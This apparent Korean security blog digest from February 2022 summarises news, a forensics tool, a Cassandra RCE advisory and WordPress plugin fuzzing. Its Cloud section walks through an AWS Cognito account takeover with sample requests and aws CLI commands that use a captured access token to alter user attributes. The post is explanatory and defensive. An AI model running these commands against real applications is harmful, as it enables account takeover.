---
layout: post
title: 보안기사 이모저모
date: 2022-02-17 09:00:00 +0900
category: SecurityNews
---


# [ Security News ]
---
#### 우크라 국방부 사이트 등 사이버 공격받아…"러시아 소행 추정"(종합) [[link]](https://www.yna.co.kr/view/AKR20220216003251071?input=1195m&fbclid=IwAR168MmSMLLhlGUt0512EhAqxxt56Fs1Q-qswKwWSj7BetiEBH5DENRe6O8)
>- 우크라이나 사이버보안센터는 15일(현지시간) 국방부 웹사이트 등이 사이버 공격
- 러시아의 사이버 공격이 미국 대선개입 이후 다양한 형태로 발전되고 있는 듯(사이버 공격의 정치화의 대표적인 국가라고 판단)

#### 警 "사이버테러 빠르게 대응" 전담조직 신설 [[link]](https://www.mk.co.kr/news/society/view/2022/02/148834/?fbclid=IwAR1NgG68gUz_8Wago6jjj4XxfsXtZcPqGWEtRlplG-VeM9oQ4QD5Li8Y5JM)
> - 경찰, 국가 주요기관 및 기업의 사이버테러 대응역량 강화를 위해 ‘사이버테러대응과’ 신설
+ 기존 ‘사이버범죄수사과 소속 사이버테러수사대’ > ‘사이버테러대응과’로 승격

# [ Tools ]
---
#### Azure Hunter [[link]](https://github.com/darkquasar/AzureHunter?fbclid=IwAR0-YjcSfolg03nbok034fknpRjcZCRZvlaLUrAj9-DSUD8AuZBIkKJiWFw)
#Azure, #Threat Hunting, #Playbook, #PowerShell
> - 개요 : PowerShell로 구동되는 Cloud Forensics용으로 Azure 및 Office365의 데이터에 대한 플레이북
- 구동매커니즘
![이미지] (https://github.com/SecurityMgr/securitymgr.github.io/blob/main/_img/2022/220217_1.png?raw=true) 
- 구동결과
![이미지] (https://github.com/SecurityMgr/securitymgr.github.io/blob/main/_img/2022/220217_2.png?raw=true) 
- 구동방법
1. 올바른 O365의 권한보유여부 확인
- UnifiedAuditLog의 읽기전용(read only) 액세스 권한을 가지려면 Exchange Online에서 ‘View-Only Audit Logs’과 ‘Audit Logs’ 역할(Role)이 필요
+ 감사 로그 검색(audit log search)은 Microsfot 365 및 Offcie 365 Enterprise에 기본으로 실행되고 있으며, 아래 PowerShell을 통해서 확인 가능
- PowerShell Command : Get-AdminAuditLogConfig | FL UnifiedAuditLogIngestionEnabled
+ UnifiedAuditLogIngestionEnabled True속성값은 감사로그검색이 켜져있는 것을 의미
+ UnifiedAuditLog : ExchangeItems, SharePoint, Azure AD, OneDrive, 데이터 거버넌스, 데이터 손실 방지, Windows Defender 경고 및 격리 이벤트, 위협 인텔리전스 이벤트와 같은 여러 유형의 클라우드 작업에 대한 로그정보를 제공
![이미지](https://github.com/SecurityMgr/securitymgr.github.io/blob/main/_img/2022/220217_3.png?raw=true) 
- 감사기록이 켜져 있는 경우 : CmdletParameters에서 Confirm이 존재하면 True 상태(없는경우 False상태) ]
![이미지](https://github.com/SecurityMgr/securitymgr.github.io/blob/main/_img/2022/220217_4.jpg?raw=true) 
 Microsoft 365 services that support auditing

2. ExchangeOnlineManagement v2 PowerShell 모듈 설치여부 확인
3. Repo에서 복제하거나 PSGallery에서 AzureHunter를 설치

#### How To Run Maltego – Cyber Intelligence And Forensics Software [[link]](https://hackersonlineclub.com/how-to-run-maltego-cyber-intelligence-and-forensics-software/?fbclid=IwAR3m7LkvOS5jp1SyimZCzrIE3gt28I_xsya8TW8kIe_NzVSdTD5PV44T8gY)
> - kali linux에서 인텔리전스 도구인 Maltego 동작 방법

# [ Vulnerability ]
---
#### CVE-2021-44521 – Exploiting Apache Cassandra User-Defined Functions for Remote Code Execution [[link]](https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/?fbclid=IwAR3VZ3ba_7pPKTReMV0KdZIPWEdCq2HQ3AyzrhD3yx-L423y-YL4TXZ8bis)
- 개요
>- 분산 NoSQL 데이터베이스인 Apache Cassandra의 RCE취약점 발견(CVE-2021-44521, CVSS 8.4)
	+ JFrog Security 취약점 연구 팀의 Omer Kaspi에 의해 취약점 발견
- Apache Cassandra 실행시에 아래와 같이 설정된 경우 RCE취약점 발생
	+ enable_user_defined_functions: true
	+ enable_scripted_user_defined_functions: true
	+ enable_user_defined_functions_threads: false
- 공격자는 이를 악용해 클러스터에서 사용자 정의함수를 생성할 수 있는 권한이 필요
- 대응방안
	+ enable_user_defined_functions_threads: true (Default 설정)
	+ 보안업데이트 : Cassandra 3.0.26, 3.11.12, 4.0.2

# A technique to semi-automatically discover new vulnerabilities in WordPress plugins [[link]](https://kazet.cc/2022/02/03/fuzzing-wordpress-plugins.html?fbclid=IwAR3fcwJX1fUxbsFhmN4RZ1bj7WEgcYg8BU-3r7B3kK2HG-Tvvn4ZgC7ytEM)
- 개요
> - WordPress 플러그인에서 여러 클래스의 취약점을 반자동으로 검색가능한 도구 개발 및 취약점 발견
- PHP에서 _GET, _POST, _SERVER, _COOKIE및 _REQUEST배열에는 다양한 요청 매개변수(예: GET 및 POST 데이터, 쿠키, 서버 구성 및 헤더)를 대상으로 페이로드를 삽입하는 POC 테스트 진행

- 취약점 발견 도구의 타깃
	+ AJAX 끝점( /wp-admin/admin-ajax.php)
	+ 관리자 메뉴 페이지( /wp-admin/admin.php?page=...)
	+ PHP 파일( /wp-content/plugins/디렉토리에 있음)
	+ REST 경로( /wp-json/...).
- 취약점 발견 도구의 방법
	+ 각 AJAX 끝점, 메뉴 페이지, REST 경로 또는 파일을 여러 번 실행
	+ 페이로드를 GET, POST 등 arrays 또는 REST 매개변수에 주입
	+ 공격페이로드 탐지를 위한 정규표현식 목록 : WordPress 기능 호출(예: wp_delete_post), 충돌(“No such file or directory”, “You have an error in your SQL syntax”등), XSS

# [ Malware ]
---
#### NFT Lure Used to Distribute BitRAT [[link]](https://www.fortinet.com/blog/threat-research/nft-lure-used-to-distribute-bitrat?fbclid=IwAR2qKOsEJKeqLmWl3AUSnkdyofIEdv0LPw3uyFs2LfLdjAKsJNZUY1mwHVw)


# [ Report ]
---
#### 2022 Global Threat Report, CrowdStrike [[link]](https://www.crowdstrike.com/global-threat-report/)

# [ Cloud ]
---
#### Hacking AWS Cognito Misconfiguration to Zero Click Account Takeover [[link]](https://infosecwriteups.com/hacking-aws-cognito-misconfiguration-to-zero-click-account-takeover-36a209a0bd8a)
#AWS_Cognito, #Misconfiguration
- Flickr Account Takeover using AWS Cognito API(https://hackerone.com/reports/1342088)을 토대로 작성된 블로깅
Flickr Access Takeover Attack Flow
![이미지](https://github.com/SecurityMgr/securitymgr.github.io/blob/main/_img/2022/220217_5.png?raw=true)
 

1. 개요
>- 앱에 로그인하면 POST요청이 AWS Cognito로 전송
- 자격증명이 유효한 경우 AWS Cognito에서 토큰을 제공
```HTTP/2 200 OK
Date: Thu, 32 Abc 2040 25:51:36 GMT
[...]{
    "AuthenticationResult":    
        {
            "AccessToken":"[REDACTED]",
            "ExpiresIn":3600,
            "IdToken":"[REDACTED]",
            "RefreshToken":"[REDACTED]",
            "TokenType":"Bearer"
        },
        "ChallengeParameters":
        {            
        }
}```

- 그 이후 앱에서 AWS Cognito에 요청을 보내 사용자 세부정보를 가져오는 과정을 거치는데 ‘X-Amz-Target: AWSCognitoIdentityProviderService.GetUser’헤더의 AccessToken과 함꼐 게시 요청으로 전송
```POST / HTTP/1.1
Host: cognito-idp.eu-west-1.amazonaws.com
Referer: https://target
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.GetUser
X-Amz-User-Agent: aws-amplify/0.1.x js
Origin: https://target
Content-Length: 1021
Connection: close{"AccessToken":"<AccessToken>"}```
- 사용자 속성은 응답값을 통해서 확인 가능
```{
"UserAttributes": [
{
"Name": "sub",
"Value": "d7fdsfdfdsfdf9-4558b142bb58"
},
{
"Name": "email_verified",
"Value": "true"
},
{
"Name": "given_name",
"Value": "asddfdf"
},
{
"Name": "family_name",
"Value": "asdsddfdf"
},
{
"Name": "email",
"Value": "attacker@domain.com"
}
],
"Username": "sdfdsfdff8b142bb58"
}```
- 공격절차
- 로그인 후 획득한 AccessToken은 AWS-CLI에서 바로 사용이 가능하며 Flickr Account Takeover(https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/#amazon-cognito)블로깅 내용에 따라 아래 명령어를 사용해 사용자 속성 확인이 가능
aws --no-verify-ssl cognito-idp get-user --region eu-west-1 --access-token <Insert Token Here>
- 위 단계를 거쳐 ‘update-user-attributes’를 통해 속성을 수정하여 새로운 속성을 추가하려고 했으나 실제 구현되지 않아 ’given_name’의 기존 속성변경을 통해 공격 수행가능
aws --no-verify-ssl cognito-idp update-user-attributes --region eu-west-1 --access-token <Insert Token Here> --user-attributes 'Name=given_name,Value=changed by AWS-CLI'

# [ AI/ML ]
---
#### Python Library-Feature Engine
**파이썬 라이브러리 중 Feature Engineering에 특화된 라이브러리 Feature Engine을 소개합니다. 크게 제공하는 기능은 다음과 같습니다.**
>- Missing Data Imputation
- Categorical Variable Encoding
- Variable Transformation
- Variable Discretisation
- Outlier Handling
- Feature Creation
- Feature Selection
**장점**
사용 방법 자체는 sklearn과 같이 fit(), transform()으로 사용할 수 있다는 장점이 있습니다. 캐글에서 사용하는 다양한 테크닉이 포함되어 있어 Pandas에서 Scratch로 구현하기 어려운 분들에게 조금은 도움이 될 수 있을 것 같습니다. 
또한 기존에 Sckit-learn에서는 data transform을 하기 위해 pd.Series로 전달하여 np.array로 결과를 반환하기에 다시 table에 합치는 과정이 일부 번거로움이 있었습니다. 그런데 이 라이브러리는 pd.DataFrame을 전달하여 pd.DataFrame을 반환해주어 번거로움을 줄여주었습니다.
**아쉬운 점**
파라미터명이 기존 라이브러리와 매칭되지 않는 부분이 있어 아쉬운 점이 있습니다. 기존 pandas는 coloums 또는 cols로 열을 표현한다면 이 라이브러리에서는 variables라는 명칭을 사용합니다.
그 외에도 Feature Creation에서 combination할때 커스텀 함수 기능이 있으면 더 나아질 것 같다는 생각입니다. 현재는 사칙연산 정도만 제공을 하고 있네요.
**기대**
기대되는 부분은 여기서 목표하고 있는 time-series data / text data  feature engineering이 추가된다면 확실히 범용적인 툴이 될 수 있을 것 같다는 기대가 되네요. 아래 사진은 이들의 확장 목표에 대한 다이어그램인데 기대가 많이 됩니다.
라이브러리 링크는 다음과 같습니다.[링크](https://feature-engine.readthedocs.io/en/1.1.x/)

#### Hugging Face : 머신러닝 오픈소스 공유 플랫폼 [[link]](https://huggingface.co/)
>- ML 모델, 데이터셋 오픈소스들이 모여있으며 Spaces를 통해 다양한 ML app들을 사용가능
- 다양한 리소스(문서, 커뮤니티)등이 존재하고 과금을 통해 AutoNLP, API, CPU/GPU등을 제공받아 사용 가능
